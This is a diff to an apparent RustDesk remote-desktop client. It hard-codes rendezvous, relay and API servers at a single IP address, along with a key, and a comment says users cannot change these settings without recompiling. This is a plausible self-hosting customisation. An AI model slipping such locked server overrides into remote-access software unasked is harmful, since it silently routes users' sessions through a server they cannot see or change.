@@ -1749,6 +1749,15 @@ pub fn rustdesk_interval(i: Interval) -> ThrottledInterval {
 }
 
 pub fn load_custom_client() {
+    // 预配置默认中继服务器设置（最高优先级）
+    // 这些设置无法被用户更改，除非通过 HACK: 重新编译
+    let mut hard_settings = config::HARD_SETTINGS.write().unwrap();
+    hard_settings.insert("custom-rendezvous-server".into(), "8.153.105.121:21116".into());
+    hard_settings.insert("relay-server".into(), "8.153.105.121:21117".into());
+    hard_settings.insert("api-server".into(), "http://8.153.105.121:21114".into());
+    hard_settings.insert("key".into(), "lr8I43Tc0Qnsa1RIyJVkVxKwll1I2xxpPOco9HWcEa4=".into());
+    drop(hard_settings);
+
     #[cfg(debug_assertions)]
     if let Ok(data) = std::fs::read_to_string("./custom.txt") {
         read_custom_client(data.trim());
